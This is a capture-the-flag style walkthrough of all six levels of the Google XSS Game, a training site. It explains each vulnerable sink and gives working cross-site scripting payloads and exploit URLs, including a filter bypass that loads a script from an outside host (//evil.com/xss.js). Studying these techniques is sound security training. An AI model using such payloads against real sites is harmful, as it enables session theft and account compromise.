# Google XSS Game Walkthrough (Levels 1–6)

A complete write-up of all six levels of the [Google XSS Game](https://xss-game.appspot.com), showcasing how each level demonstrates a different form of Cross-Site Scripting (XSS).

---

## [1/6] Level 1: Hello, World of XSS

1.	Objective: Trigger an alert by injecting JavaScript into the query URL parameter.
 ![challenge1]( challenges/1.png)
2.	Code Behavior:
  a.	The application reflects the query parameter into the page without sanitization:
  b.	![code1](codes/1.png)
4.	Vulnerability
  a.	Reflected Cross-Site Scripting (XSS):
  b.	User input is placed directly into the DOM using .innerHTML without sanitization or escaping. 
5.	Payload: <script>alert(1)</script>
6.	Exploit URL: https://xss-game.appspot.com/level1/frame?query=<script>alert(1)</script>ipt>
![result1](result/1.png)
---

## [2/6] Level 2: Persistence Is Key

1.	Objective: Exploit stored XSS by injecting JavaScript into a message field that will be saved and later reflected into the page.
 ![challenge2]( challenges/2.png)
2.	Code Behavior
   a.	 ![code2](codes/2.png)
3.	Vulnerability
  a.	Stored XSS (DOM-based):
  b.	User input is unsafely embedded into the DOM using .innerHTML, allowing script execution.
4.	Payload: <img src=x onerror=alert(1)>
![result2](result/2.png)
---

## [3/6] Level 3: That Sinking Feeling...
1.	Objective: Trigger XSS by injecting into a JavaScript sink that uses user input to build and insert raw HTML.
 ![challenge3]( challenges/3.png)
2.	Code Behavior
   a.	 ![code3](codes/3.png)
   b.	The app reads input from location.hash and passes it to chooseTab().
  d.	Inside chooseTab(num), your input is used to dynamically build HTML
  e.	This creates a string of HTML with your input directly inserted into an <img> tag’s src attribute using .html() — a dangerous sink.
3.	Vulnerability
  a.	DOM-based reflected XSS
  b.	No input validation or sanitization
  c.	Direct insertion into HTML via .html() with attacker-controlled num
  d.	Allows attribute injection and event handler execution (e.g., onerror)
4.	Payload: #1'%20onerror='alert(1)
5.	Exploit URL: https://xss-game.appspot.com/level3/frame#1'%20onerror='alert(1)
![result3](result/3.png)
---

## [4/6] Level 4: Context Matters
1.	Objective: Trigger a DOM-based reflected XSS by exploiting how the application uses location.hash to dynamically build an HTML element using jQuery.
 ![challenge4]( challenges/4.png)
2.	Code Behavior
  a.	 ![code4](codes/4.1.png)
  b.	 ![code4](codes/4.2.png)
  c.	The app dynamically builds JavaScript using this pattern:
  d.	Your input from the location.search (the part after ?) is directly inserted into a JavaScript string, which is then executed via setTimeout().
3.	Vulnerability
  a.	DOM-based Reflected XSS in JavaScript string context
  b.	Unescaped user input is inserted into a JavaScript string and executed
  c.	Allows attackers to close the existing expression and inject arbitrary JavaScript
4.	Payload: 1');alert(1);//
5.	Exploit URL: https://xss-game.appspot.com/level4/frame?timer=1%27%29%3Balert%281%29%3B%2F%2F
![result4](result/4.png)
---

## [5/6] Level 5: Breaking Protocol
1.	Objective: Trigger JavaScript execution by injecting a javascript: URI into a link — without using <script> or onclick.
 ![challenge5]( challenges/5.png)
2.	Code Behavior: 
  a.	 ![code5](codes/5.1.png)
  b.	 ![code5](codes/5.2.png)
  c.	The application builds a confirmation page based on the next parameter and does this
  d.	Your next value is:
    i.	Embedded directly into the href attribute
    ii.	Later executed as a redirect URL
3.	Vulnerability
  a.	DOM-based XSS via href="..." and window.location
  b.	No validation or sanitization of the next parameter
  c.	Allows injection of javascript: protocol URIs, which are executable links
4.	Payload: javascript:alert(1)
5.	Exploit URL: http://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)
![result5](result/5.png)
---

## [6/6] Level 6: Follow the 🐇
1.	Objective: Trigger XSS by injecting an external script file, even though the app tries to block URLs that start with http:// or https://.
![challenge6]( challenge/6.png)
2.	Code Behavior:
  a.	 ![code6](code/6.png)
  b.	The app dynamically creates a <script> tag using input from the URL hash (#)
3.	Vulnerability
  a.	DOM-based XSS via external script injection
  b.	App blocks only http:// and https://, but not //domain.com
  c.	You can bypass the filter using a protocol-relative URL, like //evil.com/xss.js
4.	Payload: //cdn.jsdelivr.net/gh/naorlivne/poc/xss.js ( Where that file contains: alert(1); )
5.	Exploit URL: https://xss-game.appspot.com/level6/frame#//cdn.jsdelivr.net/gh/naorlivne/poc/xss.js
![result6](result/6.png)
---

## Summary Table

| Level | Vulnerability Type        | Input Source  | Sink               | Payload Example                |
| ----- | ------------------------- | ------------- | ------------------ | ------------------------------ |
| 1     | Reflected XSS             | URL Query     | `.innerHTML`       | `<script>alert(1)</script>`    |
| 2     | Stored DOM XSS            | Message field | `.innerHTML`       | `<img src=x onerror=alert(1)>` |
| 3     | DOM Reflected XSS         | URL Hash      | `.html()`          | `#1'%20onerror='alert(1)`      |
| 4     | DOM Reflected XSS (JS)    | URL Query     | `setTimeout(...)`  | `1');alert(1);//`              |
| 5     | Protocol-based XSS        | URL Query     | `href`, redirect   | `javascript:alert(1)`          |
| 6     | Script Injection via Hash | URL Hash      | `<script src=...>` | `#//evil.com/script.js`        |

---

Created by: **Praful Mardhekar**\
Cyber Security & Offensive Security Enthusiast

